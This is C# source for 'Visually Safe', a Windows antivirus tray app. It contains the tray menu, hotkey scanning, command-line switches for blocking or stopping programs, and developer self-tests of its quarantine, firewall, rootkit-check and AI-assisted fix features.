using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Drawing;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Windows.Forms;

namespace VisuallySafe
{
    /// <summary>Lives in the notification area and owns the engine, the tray icon and the dashboard.</summary>
    class TrayApp : ApplicationContext
    {
        readonly Engine eng;
        readonly NotifyIcon tray = new NotifyIcon();
        readonly MainForm form;
        readonly Timer ui = new Timer { Interval = 400 };
        readonly Dictionary<GuardState, Icon> icons = new Dictionary<GuardState, Icon>();
        readonly ConcurrentQueue<ScanRecord> threats = new ConcurrentQueue<ScanRecord>();
        readonly ToolStripMenuItem mOn, mResume, mStartup;
        GuardState shown = (GuardState)(-1);
        DateTime exitAt = DateTime.MaxValue, lastNet = DateTime.MinValue, lastIdle = DateTime.MinValue;

        /// <summary>Restart Visually Safe as administrator (Windows shows its permission prompt once).</summary>
        void Elevate()
        {
            try
            {
                Process.Start(new ProcessStartInfo(Application.ExecutablePath,
                    "--page 2 --wait-pid " + Process.GetCurrentProcess().Id) { UseShellExecute = true, Verb = "runas" });
            }
            catch (System.ComponentModel.Win32Exception) { return; } // the user said no at the prompt
            Quit();
        }

        public TrayApp(Engine engine, bool show, int exitAfterSeconds, int page = 0)
        {
            eng = engine;
            foreach (GuardState s in Enum.GetValues(typeof(GuardState))) icons[s] = Theme.MakeIcon(s);
            form = new MainForm(eng);
            IntPtr force = form.Handle; // so the engine's background events can reach the UI thread
            form.ScanFileRequested += ScanFilePrompt;
            form.AlertSeen += () => UpdateTray();
            form.ElevateRequested += Elevate;
            form.SaverRequested += () => ScreenSaver.Start(eng, null);
            form.DefragSaverRequested += () => ScreenSaver.Start(eng, null, "defrag");
            eng.Threat += r => threats.Enqueue(r);
            if (exitAfterSeconds > 0) exitAt = DateTime.Now.AddSeconds(exitAfterSeconds);

            var menu = Menus.Make();
            var open = new ToolStripMenuItem("Open Visually Safe", null, (s, e) => ShowForm(0));
            open.Font = new Font(open.Font, FontStyle.Bold);
            mOn = new ToolStripMenuItem("Protection on", null, (s, e) => eng.SetEnabled(!eng.S.Enabled));
            mResume = new ToolStripMenuItem("Resume now", null, (s, e) => eng.SetEnabled(true));
            var pause = new ToolStripMenuItem("Pause");
            pause.DropDownItems.Add("For 15 minutes", null, (s, e) => eng.Pause(TimeSpan.FromMinutes(15)));
            pause.DropDownItems.Add("For 1 hour", null, (s, e) => eng.Pause(TimeSpan.FromHours(1)));
            pause.DropDownItems.Add("For 4 hours", null, (s, e) => eng.Pause(TimeSpan.FromHours(4)));
            mStartup = new ToolStripMenuItem("Start with Windows", null, (s, e) => Startup.Set(!Startup.Get()));
            menu.Items.AddRange(new ToolStripItem[]
            {
                open, new ToolStripSeparator(),
                mOn, pause, mResume, new ToolStripSeparator(),
                new ToolStripMenuItem("Quick scan", null, (s, e) => { eng.QuickScan(); ShowForm(0); }),
                new ToolStripMenuItem("Scan a file…", null, (s, e) => ScanFilePrompt()),
                new ToolStripMenuItem("Scan selected icons now (Ctrl+Alt+S)", null, (s, e) => ScanSelection(false)),
                new ToolStripMenuItem("Start screen saver now", null, (s, e) => ScreenSaver.Start(eng, null)),
                new ToolStripMenuItem("Start defrag screen saver now", null, (s, e) => ScreenSaver.Start(eng, null, "defrag")),
                (mGlow = new ToolStripMenuItem("Light up icons while scanning", null, (s, e) => { eng.S.ScanGlow = !eng.S.ScanGlow; eng.S.Save(); })),
                (mShell = new ToolStripMenuItem("\"Scan with Visually Safe\" in right-click menu", null, (s, e) => ShellMenu.Toggle(eng))),
                new ToolStripMenuItem("Update Visually Safe with AI…", null, (s, e) => { var f = new SelfUpdateForm(eng); f.Show(); f.Activate(); }),
                new ToolStripMenuItem("Microsoft Defender: status", null, (s, e) => System.Threading.Tasks.Task.Run(() => DefenderLink.StatusText()).ContinueWith(t => tray.ShowBalloonTip(9000, "Microsoft Defender", t.Result, ToolTipIcon.Info))),
                new ToolStripMenuItem("Microsoft Defender: update definitions now", null, (s, e) => System.Threading.Tasks.Task.Run(() => DefenderLink.UpdateSignatures()).ContinueWith(t => tray.ShowBalloonTip(6000, "Microsoft Defender", t.Result != null ? "Definitions are up to date." : "Could not update them just now.", ToolTipIcon.Info))),
                new ToolStripMenuItem("Wake the wizard", null, (s, e) => Wizard.Wake()),
                new ToolStripMenuItem("Support Visually Safe (Ko-fi)", null, (s, e) => { try { System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("https://ko-fi.com/johncorreia9791") { UseShellExecute = true }); } catch { } }),
                new ToolStripMenuItem("Family helper mode…", null, (s, e) => { var f = new HelperSetupForm(eng); f.Show(); f.Activate(); }),
                new ToolStripSeparator(),
                mStartup,
                new ToolStripMenuItem("Exit Visually Safe", null, (s, e) => Quit())
            });
            menu.Opening += (s, e) =>
            {
                mOn.Checked = eng.S.Enabled;
                mResume.Visible = eng.S.Enabled && !eng.Active;
                pause.Enabled = eng.S.Enabled;
                mStartup.Checked = Startup.Get();
                mGlow.Checked = eng.S.ScanGlow; mShell.Checked = ShellMenu.Wanted(eng);
            };

            tray.ContextMenuStrip = menu;
            tray.MouseClick += (s, e) => { if (e.Button == MouseButtons.Left) ShowForm(form.Alert ? 1 : 0); };
            tray.BalloonTipClicked += (s, e) => ShowForm(1);
            tray.Visible = true;
            UpdateTray();

            Persistence.Found += (title, text) => shieldAlerts.Enqueue(new Tuple<string, string, bool>(title, text, false));
            eng.Shield.Alert += (title, text, severe) => shieldAlerts.Enqueue(new Tuple<string, string, bool>(title, text, severe));
            ui.Tick += (s, e) => OnTick();
            ui.Start();
            if (show) ShowForm(page);
            if (Admin.IsAdmin) Startup.UpgradeIfAdmin();
            if (eng.S.SystemSaver) SystemSaver.SyncCopy();
            hot = new HotKeyWindow(); hot.Pressed += () => ScanSelection();
            Helper.Start(eng);
            SelfUpdateForm.RestartRequested += () => Quit();
            ScanGlow.Init(eng);
            System.Threading.Tasks.Task.Run(() => { System.Threading.Thread.Sleep(30000); try { eng.RecheckWarnings(); } catch { } });     // warnings that Windows' protection finds nothing wrong with are dropped
            ShellMenu.Apply(eng);
            SaverPipe.StartServer(eng.DataDir, (cmd, done) =>
            {
                if (cmd.StartsWith("SCAN|"))
                {
                    try { LogScan("menu", cmd.Substring(5)); eng.ScanNow(cmd.Substring(5)); } catch (Exception ex) { LogScan("menu-error", ex.Message); }
                    done(); return;
                }
                try
                {
                    form.BeginInvoke(new Action(() =>
                    {
                        if (cmd.StartsWith("SAVER")) { if (ScreenSaver.Active) done(); else ScreenSaver.Start(eng, done, SaverPipe.ModeOf(cmd)); }
                        else if (cmd == "SETTINGS") { ShowForm(9); done(); }
                        else if (cmd == "SHOW") { ShowForm(0); done(); }
                        else if (cmd.StartsWith("SCAN|")) { LogScan("menu", cmd.Substring(5)); eng.ScanNow(cmd.Substring(5)); done(); }
                        else done();
                    }));
                }
                catch { done(); }
            });
        }

        /// <summary>Start the screen saver by itself once the PC has been idle long enough (unless Windows' own screen saver does it).</summary>
        void CheckIdle()
        {
            if (ScreenSaver.Active || !eng.S.ScreensaverIdle || eng.S.SystemSaver || !eng.Active) return;
            if (IdleInfo.IdleMs() < eng.S.ScreensaverMinutes * 60000) return;
            if (IdleInfo.FullscreenAppActive()) return;                                              // a game or a video is on screen
            if (SystemInformation.PowerStatus.PowerLineStatus == PowerLineStatus.Offline) return;   // on battery: leave the processor alone
            ScreenSaver.Start(eng, null);
        }

        void OnTick()
        {
            Tuple<string, string, bool> sa;
            while (shieldAlerts.TryDequeue(out sa))
            {
                form.Alert = true;
                tray.ShowBalloonTip(9000, sa.Item1, sa.Item2, sa.Item3 ? ToolTipIcon.Error : ToolTipIcon.Warning);
            }
            while (threats.TryDequeue(out ScanRecord r))
            {
                form.Alert = true;
                bool mal = r.Verdict == Verdict.Malicious;
                tray.ShowBalloonTip(6000,
                    mal ? (r.Quarantined ? "Malware blocked and quarantined" : "Malware found") : "Suspicious file",
                    r.Name + "\n" + r.Detail, mal ? ToolTipIcon.Error : ToolTipIcon.Warning);
                form.RefreshAll(true);
            }
            UpdateTray();
            if (form.Visible) form.RefreshAll();
            if ((DateTime.Now - lastNet).TotalMilliseconds >= 950) { lastNet = DateTime.Now; form.RefreshNetwork(); }
            if ((DateTime.Now - lastIdle).TotalSeconds >= 2) { lastIdle = DateTime.Now; try { eng.Shield.Tick(); } catch { } try { CheckIdle(); } catch { } try { SelfUpdate.TrialTick(eng, startedAt); } catch { } }
            if ((DateTime.Now - lastPersist).TotalMinutes >= 10 && !eng.ScanActive) { lastPersist = DateTime.Now; System.Threading.Tasks.Task.Run(() => { try { Persistence.Check(eng, true); } catch { } }); }
            if (DateTime.Now >= exitAt) Quit();
            if (hot != null && !hot.Ok && (DateTime.Now - lastHot).TotalSeconds >= 5) { lastHot = DateTime.Now; hot.Retry(); LogScan("hotkey", hot.Ok ? "registered" : "Ctrl+Alt+S is taken by another program"); }
        }
        DateTime lastHot = DateTime.MinValue, lastPersist = DateTime.Now.AddMinutes(-9);

        void UpdateTray()
        {
            GuardState st = form.State;
            if (st == shown) return;
            shown = st;
            tray.Icon = icons[st];
            tray.Text = "Visually Safe — " + (st == GuardState.Protected ? "protecting" : st == GuardState.Paused ? "paused" : st == GuardState.Off ? "off" : "threat found");
            form.RefreshAll(true);
        }

        void ShowForm(int page)
        {
            form.SelectPage(page);
            form.Show();
            if (form.WindowState == FormWindowState.Minimized) form.WindowState = FormWindowState.Normal;
            form.Activate();
        }

        ToolStripMenuItem mGlow, mShell;
        HotKeyWindow hot;

        /// <summary>Scans every file and folder selected on the Desktop or in open Explorer windows (any number).</summary>
        void LogScan(string how, string path)
        {
            try { File.AppendAllText(Path.Combine(eng.DataDir, "scan-requests.log"), DateTime.Now.ToString("HH:mm:ss.fff") + "	" + how + "	" + path + Environment.NewLine); } catch { }
        }

        [System.Runtime.InteropServices.DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();

        void ScanSelection(bool fromHotkey = true)
        {
            IntPtr front = fromHotkey ? GetForegroundWindow() : IntPtr.Zero;   // the window you were in when you pressed the keys
            LogScan("hotkey-pressed", "reading what is selected");
            System.Threading.Tasks.Task.Run(() =>
            {
                List<string> sel = null; var swSel = System.Diagnostics.Stopwatch.StartNew();
                try { sel = ScanGlow.SelectedPaths(front); } catch (Exception exSel) { LogScan("selection-error", exSel.Message); }
                LogScan("selection-time", swSel.ElapsedMilliseconds + " ms");
                LogScan("selection-found", (sel == null ? 0 : sel.Count) + " items");
                if (sel != null) foreach (string q in sel) LogScan("selection", q);
                try
                {
                    form.BeginInvoke(new Action(() =>
                    {
                        if (sel == null || sel.Count == 0) { tray.ShowBalloonTip(3000, "Visually Safe", "Nothing is selected. Select some icons on the Desktop or in a folder first, then press Ctrl+Alt+S.", ToolTipIcon.Info); return; }
                        foreach (string p in sel) eng.ScanNow(p);
                        tray.ShowBalloonTip(3000, "Visually Safe", "Scanning " + sel.Count + " selected item" + (sel.Count == 1 ? "" : "s") + ".", ToolTipIcon.Info);
                    }));
                }
                catch { }
            });
        }
        readonly DateTime startedAt = DateTime.Now;

        void ScanFilePrompt()
        {
            using (var d = new OpenFileDialog { Title = "Choose a file to check", CheckFileExists = true })
            {
                if (d.ShowDialog() != DialogResult.OK) return;
                eng.ScanNow(d.FileName);
            }
            ShowForm(1);
        }

        readonly System.Collections.Concurrent.ConcurrentQueue<Tuple<string, string, bool>> shieldAlerts = new System.Collections.Concurrent.ConcurrentQueue<Tuple<string, string, bool>>();

        void Quit()
        {
            SelfGuard.MarkUserExit(eng.DataDir);
            // Disappear at once, clean up in the background for at most 2.5 s, then leave for good.
            // (Stopping the Windows network trace and the file watchers can take a few seconds.)
            var t0 = DateTime.Now;
            ui.Stop();
            tray.Visible = false;
            form.ReallyClose = true;
            form.Hide();
            bool clean = System.Threading.Tasks.Task.Run(() => eng.Dispose()).Wait(2500);
            try
            {
                File.AppendAllText(Path.Combine(eng.DataDir, "crash.log"), DateTime.Now.ToString("s") + " [exit] cleanup took " +
                    (int)(DateTime.Now - t0).TotalMilliseconds + " ms" + (clean ? "" : " (gave up waiting)") + Environment.NewLine);
            }
            catch { }
            Environment.Exit(0);
        }
    }

    /// <summary>Runs only the screen saver (when Windows starts VisuallySafe.scr and Visually Safe isn't already running).</summary>
    /// <summary>A system-wide hotkey (Ctrl+Alt+S) that scans whatever icons are selected.</summary>
    class HotKeyWindow : NativeWindow, IDisposable
    {
        [System.Runtime.InteropServices.DllImport("user32.dll")] static extern bool RegisterHotKey(IntPtr h, int id, int mod, int vk);
        [System.Runtime.InteropServices.DllImport("user32.dll")] static extern bool UnregisterHotKey(IntPtr h, int id);
        public event Action Pressed;
        public bool Ok;
        public HotKeyWindow() { CreateHandle(new CreateParams()); Retry(); }   // Ctrl+Alt+S, no auto-repeat
        /// <summary>Registers the hotkey if it isn't yet (another program may hold it for a moment, e.g. the copy of Visually Safe that was just closed).</summary>
        public void Retry() { if (!Ok) Ok = RegisterHotKey(Handle, 1, 0x2 | 0x1 | 0x4000, (int)Keys.S); }
        protected override void WndProc(ref Message m) { if (m.Msg == 0x0312 && Pressed != null) Pressed(); base.WndProc(ref m); }
        public void Dispose() { try { UnregisterHotKey(Handle, 1); DestroyHandle(); } catch { } }
    }

    class SaverOnly : ApplicationContext
    {
        public SaverOnly(Engine eng, string mode)
        {
            ScreenSaver.Start(eng, () =>
            {
                System.Threading.Tasks.Task.Run(() => eng.Dispose()).Wait(2500);
                Environment.Exit(0);
            }, mode);
        }
    }

    static class Program
    {
        static string Arg(string[] args, string name)
        {
            int i = Array.IndexOf(args, name);
            return i >= 0 && i + 1 < args.Length ? args[i + 1] : null;
        }

        [System.Runtime.InteropServices.DllImport("kernel32.dll")] static extern bool AttachConsole(int pid);

        static string CliAction(string sw, string path)
        {
            if (string.Equals(path, Application.ExecutablePath, StringComparison.OrdinalIgnoreCase)) return "Refused: that is Visually Safe itself.";
            if (sw == "--net-block" || sw == "--net-unblock")
            {
                if (!Admin.IsAdmin) return "Failed: this needs administrator rights (run the command from an elevated prompt).";
                string err = sw == "--net-block" ? Firewall.Block(path) : Firewall.Unblock(path);
                return err == null ? "OK: " + (sw == "--net-block" ? "internet blocked for " : "internet allowed again for ") + path + (sw == "--net-block" ? " (undo: VisuallySafe.exe --net-unblock \"" + path + "\")" : "") : "Failed: Windows Firewall said: " + err;
            }
            int n = 0, denied = 0;
            foreach (var p in System.Diagnostics.Process.GetProcesses())
            {
                string pp; try { pp = ProcWatch.PathOf(p.Id); } catch { continue; }
                if (pp == null || !string.Equals(pp, path, StringComparison.OrdinalIgnoreCase)) continue;
                if (ProcWatch.Kill(p.Id, path)) n++; else denied++;
            }
            return n > 0 ? "OK: stopped " + n + " running copy(ies) of " + path + (denied > 0 ? " (" + denied + " could not be stopped)" : "") : denied > 0 ? "Failed: it is running but Windows wouldn't let it be stopped." : "OK: it isn't running.";
        }

        [STAThread]
        static int Main(string[] args)
        {
            ServicePointManager.SecurityProtocol |= SecurityProtocolType.Tls12;
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            using (Graphics g = Graphics.FromHwnd(IntPtr.Zero)) Theme.K = g.DpiX / 96f;

            string dataDir = Environment.GetEnvironmentVariable("VISUALLYSAFE_DATA");
            if (string.IsNullOrEmpty(dataDir)) dataDir = Environment.GetEnvironmentVariable("TINYGUARD_DATA");
            bool defaultData = string.IsNullOrEmpty(dataDir);
            if (defaultData)
                dataDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "VisuallySafe");
            dataDir = Path.GetFullPath(dataDir);
            if (defaultData) LegacyName.MigrateData(dataDir);
            Directory.CreateDirectory(dataDir);
            if (defaultData) LegacyName.CleanUser();
            // Write anything that would crash Visually Safe to crash.log, so a silent exit can be explained.
            string crashLog = Path.Combine(dataDir, "crash.log");
            Action<string, object> logCrash = (where, ex) =>
            {
                try { File.AppendAllText(crashLog, DateTime.Now.ToString("s") + " [" + where + "] admin=" + Admin.IsAdmin + Environment.NewLine + ex + Environment.NewLine + Environment.NewLine); } catch { }
            };
            // Actions an AI agent (or you) can run from a command line: cut one program's internet, give it back, or stop that program.
            //   VisuallySafe.exe --net-block "C:\path\app.exe"    VisuallySafe.exe --net-unblock "C:\path\app.exe"    VisuallySafe.exe --stop-program "C:\path\app.exe"
            foreach (string sw in new[] { "--net-block", "--net-unblock", "--stop-program" })
            {
                string target = Arg(args, sw); if (target == null) continue;
                AttachConsole(-1);
                string msg;
                try { msg = CliAction(sw, Path.GetFullPath(target)); } catch (Exception ex) { msg = "Failed: " + ex.Message; }
                Console.WriteLine(msg);
                try { File.AppendAllText(Path.Combine(dataDir, "agent-actions.log"), DateTime.Now.ToString("s") + " " + sw + " " + target + " -> " + msg + Environment.NewLine); } catch { }
                return msg.StartsWith("OK") ? 0 : 1;
            }
            if (Array.IndexOf(args, "--watchdog") >= 0) return SelfGuard.WatchdogRun(dataDir);     // from the scheduled task: bring Visually Safe back if it was killed
            AppDomain.CurrentDomain.UnhandledException += (s, e) => logCrash("unhandled", e.ExceptionObject);
            Application.ThreadException += (s, e) => logCrash("ui", e.Exception);
            Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
            AppDomain.CurrentDomain.ProcessExit += (s, e) => { try { File.AppendAllText(crashLog, DateTime.Now.ToString("s") + " [exit] normal shutdown" + Environment.NewLine); } catch { } };

            string shot = Arg(args, "--shot");            // developer aid: save pictures of each page and exit
            int exitAfter = int.Parse(Arg(args, "--exit-after") ?? "0"); // developer aid: quit after N seconds

            string feat = Arg(args, "--features");      // developer aid: write a file's AI features (and score) to <file>.tgf
            if (feat != null)
            {
                var x = AiModel.Features(File.ReadAllBytes(feat));
                var lines = new System.Collections.Generic.List<string>();
                foreach (float v in x) lines.Add(v.ToString("R", System.Globalization.CultureInfo.InvariantCulture));
                var m = AiModel.TryLoad(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "visuallysafe.model"));
                lines.Add(m != null ? m.Predict(x).ToString("R", System.Globalization.CultureInfo.InvariantCulture) : "-1");
                File.WriteAllLines(Arg(args, "--out") ?? feat + ".tgf", lines);
                return 0;
            }

            string netTest = Arg(args, "--net-test");   // developer aid (admin): traffic + firewall self-test using the given curl copy
            if (netTest != null)
            {
                var log = new System.Text.StringBuilder();
                Func<int> curl = () =>
                {
                    var p = Process.Start(new ProcessStartInfo(netTest, "-s -f -m 20 -L -o NUL https://github.com/YARAHQ/yara-forge/releases/download/20261115/yara-forge-rules-core.zip")
                    { UseShellExecute = false, CreateNoWindow = true });
                    p.WaitForExit(); return p.ExitCode;
                };
                log.AppendLine("admin: " + Admin.IsAdmin);
                using (var mon = new NetMonitor())
                {
                    log.AppendLine("monitor started: " + mon.Start() + " " + mon.Error);
                    System.Threading.Thread.Sleep(2000);
                    log.AppendLine("download exit code: " + curl());
                    System.Threading.Thread.Sleep(2500);
                    log.AppendLine("events seen: " + mon.EventsSeen);
                    foreach (var a2 in mon.Snapshot(new System.Collections.Generic.HashSet<string>()).OrderByDescending(x => x.TotalIn + x.TotalOut).Take(4))
                        log.AppendLine("  " + a2.Name + "  in " + a2.TotalIn + "  out " + a2.TotalOut + "  path " + a2.Path);
                }
                log.AppendLine("block: " + (Firewall.Block(netTest) ?? "ok") + "  listed: " + Firewall.Blocked().Contains(netTest));
                System.Threading.Thread.Sleep(1000);
                log.AppendLine("download while blocked, exit code: " + curl());
                Func<string, string> sh = cmd =>
                {
                    var p = Process.Start(new ProcessStartInfo("netsh.exe", cmd) { UseShellExecute = false, CreateNoWindow = true, RedirectStandardOutput = true });
                    string o = p.StandardOutput.ReadToEnd(); p.WaitForExit(); return o;
                };
                log.AppendLine(sh("advfirewall firewall show rule name=\"VisuallySafe block out: " + netTest + "\" verbose"));
                log.AppendLine(sh("advfirewall firewall add rule name=TGDIAG dir=out action=block program=\"" + netTest + "\" enable=yes"));
                System.Threading.Thread.Sleep(1000);
                log.AppendLine("download with netsh-made rule too, exit code: " + curl());
                log.AppendLine(sh("advfirewall firewall show rule name=TGDIAG verbose"));
                log.AppendLine(sh("advfirewall firewall delete rule name=TGDIAG"));
                log.AppendLine("unblock: " + (Firewall.Unblock(netTest) ?? "ok") + "  listed: " + Firewall.Blocked().Contains(netTest));
                System.Threading.Thread.Sleep(1000);
                log.AppendLine("download after unblock, exit code: " + curl());
                File.WriteAllText(Path.Combine(dataDir, "net-test.log"), log.ToString());
                return 0;
            }

            if (Array.IndexOf(args, "--rootkit-test") >= 0)   // developer aid: run the rootkit check and write every finding to <data>\rootkit-test.log
            {
                var rc = new RootkitCheck(dataDir);
                var sw0 = Stopwatch.StartNew();
                rc.Run(true);
                var sb0 = new System.Text.StringBuilder();
                sb0.AppendLine("took " + sw0.ElapsedMilliseconds + " ms | " + rc.Coverage + " | " + rc.ListStatus);
                foreach (var fd in rc.Findings) sb0.AppendLine(fd.Sev + " | " + fd.Title + " | " + fd.Detail + " | " + fd.Path);
                File.WriteAllText(Path.Combine(dataDir, "rootkit-test.log"), sb0.ToString());
                return 0;
            }

            if (Array.IndexOf(args, "--quar-test") >= 0)   // developer aid: quarantine a file, then delete it (also while locked) and log what happened
            {
                var lg = new System.Text.StringBuilder();
                string dir = Path.Combine(dataDir, "qt"); Directory.CreateDirectory(dir);
                string tf = Path.Combine(dir, "x.exe");
                var bytes = new byte[30000]; new Random(5).NextBytes(bytes); bytes[0] = (byte)'M'; bytes[1] = (byte)'Z';
                File.WriteAllBytes(tf, bytes);
                using (var sha = System.Security.Cryptography.SHA256.Create())
                    File.WriteAllText(Path.Combine(dataDir, "blocklist.txt"), BitConverter.ToString(sha.ComputeHash(bytes)).Replace("-", "").ToLowerInvariant());
                using (var e = new Engine(dataDir))
                {
                    e.ScanNow(tf);
                    for (int i = 0; i < 40 && e.QuarantineSnapshot().Count == 0; i++) System.Threading.Thread.Sleep(500);
                    var q = e.QuarantineSnapshot().FirstOrDefault();
                    if (q == null) { lg.AppendLine("file was not quarantined"); File.WriteAllText(Path.Combine(dataDir, "quar-test.log"), lg.ToString()); return 1; }
                    string qf = Path.Combine(e.QuarDir, q.Id + ".quar");
                    lg.AppendLine("quarantined: original gone=" + !File.Exists(tf) + ", quar file exists=" + File.Exists(qf));
                    using (var lk = new FileStream(qf, FileMode.Open, FileAccess.Read, FileShare.None))
                    {
                        string r1 = e.DeleteQuarantined(q);
                        lg.AppendLine("delete while locked: " + (r1 ?? "ok") + " | still listed=" + (e.QuarantineSnapshot().Count == 1) + " | file exists=" + File.Exists(qf));
                    }
                    string r2 = e.DeleteQuarantined(q);
                    lg.AppendLine("delete after unlock: " + (r2 ?? "ok") + " | listed=" + e.QuarantineSnapshot().Count + " | file exists=" + File.Exists(qf));
                    File.WriteAllText(Path.Combine(e.QuarDir, "orphan.quar"), "leftover");
                    lg.AppendLine("leftovers counted=" + e.LeftoverCount());
                    lg.AppendLine("delete all failed=" + e.DeleteAllQuarantined() + " | files left in quarantine folder=" + Directory.GetFiles(e.QuarDir).Length);
                }
                File.WriteAllText(Path.Combine(dataDir, "quar-test.log"), lg.ToString());
                return 0;
            }

            if (Array.IndexOf(args, "--llm-test") >= 0)   // developer aid: find local AIs; with --ask <port> also run a full ask against that port
            {
                var lg = new System.Text.StringBuilder();
                var sc = Llm.Discover();
                foreach (var m in sc.Models) lg.AppendLine("found: " + m + " @ " + m.BaseUrl);
                foreach (var h in sc.Hints) lg.AppendLine("hint: " + h);
                string askPort = Arg(args, "--ask");
                if (askPort != null)
                {
                    using (var e = new Engine(dataDir))
                    {
                        var ctx2 = AssistantContext.Capture(e);
                        var ep = sc.Models.FirstOrDefault(m => m.BaseUrl.EndsWith(":" + askPort));
                        if (ep == null) lg.AppendLine("no model on port " + askPort);
                        else
                        {
                            string ans = Llm.Chat(ep, Assistant.SystemPrompt, Assistant.Report(ctx2), System.Threading.CancellationToken.None);
                            var rp = Assistant.Parse(ans, ctx2);
                            lg.AppendLine("explanation: " + rp.Explanation.Replace("\n", " "));
                            lg.AppendLine("problem: " + rp.Problem);
                            foreach (var a in rp.Actions) lg.AppendLine("action: " + a.Type + " | " + a.Path + " | " + a.State + " | " + a.Message + " | " + a.Risk);
                        }
                    }
                }
                File.WriteAllText(Path.Combine(dataDir, "llm-test.log"), lg.ToString());
                return 0;
            }

            if (Array.IndexOf(args, "--fix-test") >= 0)   // developer aid: AI-fix logic on a made-up startup entry (temporary registry value, removed afterwards)
            {
                var lg = new System.Text.StringBuilder();
                string dir = Path.Combine(dataDir, "ft"); Directory.CreateDirectory(dir);
                string prog = Path.Combine(dir, "tg-fixtest.exe");
                File.WriteAllBytes(prog, new byte[] { (byte)'M', (byte)'Z', 1, 2, 3, 4, 5, 6, 7, 8 });
                const string runKey = @"Software\Microsoft\Windows\CurrentVersion\Run";
                using (var k = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(runKey, true)) k.SetValue("VisuallySafeFixTest", "\"" + prog + "\"");
                try
                {
                    using (var e = new Engine(dataDir))
                    {
                        e.Rootkit.Run(false);
                        var fd = e.Rootkit.Findings.FirstOrDefault(x => string.Equals(x.Path, prog, StringComparison.OrdinalIgnoreCase));
                        lg.AppendLine("rootkit check found the test entry: " + (fd != null) + (fd != null ? " (startup entry root=" + fd.RegRoot + ", value=" + fd.RegValue + ")" : ""));
                        var cx = AssistantContext.Capture(e);
                        string esc = prog.Replace("\\", "\\\\");
                        string reply = "This is a test program set to start with Windows.\n```json\n[" +
                            "{\"type\":\"remove_startup_entry\",\"path\":\"" + esc + "\",\"reason\":\"test\"}," +
                            "{\"type\":\"quarantine\",\"path\":\"" + esc + "\",\"reason\":\"test\"}," +
                            "{\"type\":\"quarantine\",\"path\":\"C:\\\\other\\\\thing.exe\",\"reason\":\"not the selected item\"}]\n```";
                        var rp = Assistant.ParseFocused(reply, cx, prog);
                        foreach (var a in rp.Actions) lg.AppendLine("proposed: " + a.Type + " -> " + a.State + " " + a.Message);
                        foreach (var a in rp.Actions.Where(x => x.State == ActState.Pending)) { Assistant.Apply(a, e); lg.AppendLine("applied: " + a.Type + " -> " + a.State + " " + a.Message); }
                        using (var k = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(runKey))
                            lg.AppendLine("registry value still there: " + (k.GetValue("VisuallySafeFixTest") != null));
                        lg.AppendLine("program file still there: " + File.Exists(prog) + " | quarantine entries: " + e.QuarantineSnapshot().Count);
                        string bk = Path.Combine(dataDir, "startup-removed.tsv");
                        lg.AppendLine("backup of the entry saved: " + (File.Exists(bk) && File.ReadAllText(bk).Contains("VisuallySafeFixTest")));
                    }
                }
                finally
                {
                    using (var k = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(runKey, true)) k.DeleteValue("VisuallySafeFixTest", false);
                }
                File.WriteAllText(Path.Combine(dataDir, "fix-test.log"), lg.ToString());
                return 0;
            }

            if (Array.IndexOf(args, "--updater-test") >= 0)   // developer aid: read-only winget check (installs nothing) and option validation
            {
                var lg = new System.Text.StringBuilder();
                string werr;
                var ups = Updater.Upgrades(System.Threading.CancellationToken.None, out werr);
                lg.AppendLine("winget upgrades parsed: " + (ups == null ? "none (" + werr + ")" : ups.Count.ToString()));
                if (ups != null)
                    foreach (string probe in new[] { @"C:\Program Files\Git\cmd\git.exe", @"C:\Program Files\7-Zip\7z.exe", @"C:\Windows\System32\notepad.exe", @"C:\Windows\System32\drivers\AsIO2.sys" })
                    {
                        var pk = Updater.Find(probe, ups);
                        lg.AppendLine("  " + probe + " -> " + (pk == null ? "no match" : pk.Name + " | " + pk.Id + " | " + pk.Version + " -> " + pk.Available));
                    }
                using (var e = new Engine(dataDir))
                {
                    var cx = AssistantContext.Capture(e);
                    var fnd = new Finding { Sev = Sev.Warn, Title = "Test finding", Detail = "x", Path = "" };
                    cx.FocusFinding = fnd;
                    string txt = "ok\n```json\n[{\"type\":\"ignore\",\"reason\":\"fine\",\"recommended\":true},{\"type\":\"update\",\"reason\":\"x\"},{\"type\":\"delete\",\"path\":\"C:\\\\Windows\\\\x.exe\"}]\n```";
                    var rp = Assistant.ParseFocused(txt, cx, null);
                    foreach (var a in rp.Actions) lg.AppendLine("option: " + a.Type + " -> " + a.State + " " + a.Message + " | recommended=" + a.Recommended);
                    e.Rootkit.Ignore(fnd);
                    lg.AppendLine("ignored count after Ignore: " + e.Rootkit.IgnoredCount);
                }
                File.WriteAllText(Path.Combine(dataDir, "updater-test.log"), lg.ToString());
                return 0;
            }

            if (Arg(args, "--props-shot") != null)   // developer aid: pictures of the Properties window (AI asked on --ask-port) and the choice box
            {
                string outDir = Arg(args, "--props-shot");
                using (var e = new Engine(dataDir))
                {
                    string port = Arg(args, "--ask-port");
                    if (port != null) Llm.Preferred = Llm.Discover().Models.FirstOrDefault(m => m.BaseUrl.EndsWith(":" + port));
                    var rec = e.Snapshot().FirstOrDefault(r => r.IsThreat && !r.Quarantined);
                    if (rec == null) return 1;
                    using (var pf = new PropertiesForm(e, Props.ForRecord(e, rec)))
                    {
                        pf.StartPosition = FormStartPosition.Manual; pf.Location = new Point(40, 20);
                        pf.Show();
                        for (int t = 0; t < 100; t++) { System.Threading.Thread.Sleep(100); Application.DoEvents(); }
                        using (var bmp = new Bitmap(pf.Width, pf.Height)) { pf.DrawToBitmap(bmp, new Rectangle(0, 0, pf.Width, pf.Height)); bmp.Save(Path.Combine(outDir, "properties.png"), ImageFormat.Png); }
                    }
                    var opts = new List<ProposedAction>
                    {
                        new ProposedAction { Type = "quarantine", Path = rec.FilePath, Reason = "Locks it away so it can't run.", Risk = "Can be undone", Recommended = true },
